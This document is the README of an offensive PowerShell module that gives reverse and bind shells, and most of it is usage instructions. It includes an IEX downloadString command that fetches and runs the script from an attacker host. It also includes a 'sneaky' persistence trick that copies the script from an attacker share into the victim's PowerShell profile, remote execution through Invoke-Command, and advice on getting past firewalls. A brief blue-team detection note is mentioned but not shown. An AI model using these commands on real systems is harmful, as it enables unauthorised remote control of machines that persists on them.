# ReversePowerShell
### NOW IN POWERSHELL GALLERY!!!
```powershell
Install-Module ReversePowerShell
```
---
#
Functions that can be used to gain Reverse Shells with PowerShell. Invoke-ReversePowerShell function can be used
to connect to Start-Listener as well as netcat and metasploit modules however it can not connect to Start-Bind.
I will add a tool for that in the future. This is a PowerShell module meaning it only contains functions/cmdlets to be imported into a PowerShell session. If you wish to execute one of the commands whenever the file is run just add the command you wish to execute to the bottom of the file.

#### BLUE TEAM DISCOVERY
Find-ReverseShell.ps1 can be used to search the Windows Event Log for when a Reverse Shell is created that uses a System.Net.Sockets.TcpListener object. This will discover any reverse shell that creates a TcpListener object and not just the below module. This method does not catch PowerCat.ps1 which I am still looking for a good way to discover. This part is still a work in progress.

#### WAYS TO INSTALL OR IMPORT THE MODULE
This is not a requirement. It just a way of saving the module to your device if you wish to keep it around for use at later times.
Install this module by placing the cloned folder "ReversePowerShell" inside the following directory location.
 "$env:USERPROFILE\\WindowsPowerShell\\Modules\\ReversePowerShell"
 For PowerShell Core v6 the location of this module will need to be
 "$env:USERPROFILE\\WindowsPowerShell\\ReversePowerShell"

Once there it can be imported into a PowerShell session using the following command.
```powershell
Import-Module ReversePowerShell
```
Or in cases where you want to import the module from whatever file you are in...
```powershell
Import-Module .\ReversePowerShell.psm1
```

If your are able to use Invoke-Expresion (IEX) this module can be imported using the following command.
You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run.
Notice the .ps1 extension. When using downloadString this will need to be a ps1 file to inject the module into 
memory in order to run the cmdlets.
```powershell
IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker ipv4>/ReversePowerShell.ps1")
```

IEX is blocked from users in most cases and Import-Module is monitored by things such as ATP. Downloading files to a targerts machine is not always allowed in a penetration test. Another method to use is Invoke-Command. This can be done using the following format.
```powershell
Invoke-Command -ComputerName <target device> -FilePath .'\ReversePowerShell.ps1m' -Credential (Get-Credential)
```
This will execute the file and it's contents on the remote computer. 

Another sneaky method would be to have the function load at the start of a new PowerShell window. This can be done by editing the $PROFILE file.
```powershell
Write-Verbose "Creates powershell profile for user"
New-Item -Path $PROFILE -ItemType File -Force
#
# The $PROFILE VARIABLE IS EITHER GOING TO BE 
#    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
# OR
#    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
#
# Write-Verbose "Turning this module into the PowerShell profile will import all of the commands everytime the executing user opens a PowerShell session. This means you will need to open a new powershell session after doing this in order to access the commands. I assume this can be done by just executing the "powershell" command though you may need to have a new window opened or new reverse/bind shell opened. You can also just reload the profile
cmd /c 'copy \\<attacker ip>\MyShare\ReversePowerShell.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1

powershell.exe
# If that does not work try reloading the user profile.
& $PROFILE
```

#### START BIND SHELL
The below command can be executed to start a bind shell that connects the defined port to PowerShell.
This command binds PowerShell to port 8088. I do not have a function that can connect to this. Netcat,
ncat, metasploit, and other tools can be used to connect to this bind shell. I will add a tool in the
future.
```powershell
Start-Bind -Port 8088
```

#### START LISTENER
The below command can be executed to start a listener on the Attack machine on port 8089. This can be
connected too using Invoke-ReversePowerShell as well as ncat, netcat, metasploit, and other tools.
The listener can be stopped or canceld by doing Ctrl + C.
```powershell
Start-Listener -Port 8089
```

#### ISSUE REVERSE SHELL CONNECTION
The below command is to be issued on the Target Machine to connect to the listener over
port 8089. This will not be able to complete a connection to the Start-Bind cmdlet.
If a connection failes a loop will be started that begins a 30 second visual countdown timer.
After 30 seconds the connection will attempt to re-establish the shell.
```powershell
Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089
```
---
#### FIREWALL AND BLOCKED PORTS
If you are not able to gain a connection it is most likely due to the Windows Firewall. If you have access on a machine as a user you will not be able to make firewall changes. You need admin priviledges for that. Use the high range ports RPC would connect to or other common port. If a range has been defined you can find the allowed ports at "HKLM:\Software\Microsoft\Rpc\Internet\ with Entry name Data Type". Otherwise when not defined any ports between 49152-65535 might work.
This command may also display the port allowed RPC port range
```cmd
netsh int ipv4 show dynamicport tcp 
```

The following commands can be used to view firewall rules. If one of these does not work.
the other might.
```powershell
# This way should work to display the firewall even if you are a user
$FirewallRule = New-Object -ComObject HNetCfg.FwPolicy2
$FirewallRule.Rules | Select-Object -Property *

# OR
Get-NetFirewallRule | Where-Object { $_.Enabled –eq ‘True’ –and $_.Direction –eq ‘Inbound’ }
Show-NetFirewallRule

# OR
cmd /c netsh advfirewall firewall show rule name=all
```

#### VERIFY LISTENING PORTS
You can verify/view actively listening ports on the target computer by issuing the following command.
```powershell
Get-NetTcpConnection -State Listen
```
or if you are a command prompt kind of person;
```powershell
netstat -q
```
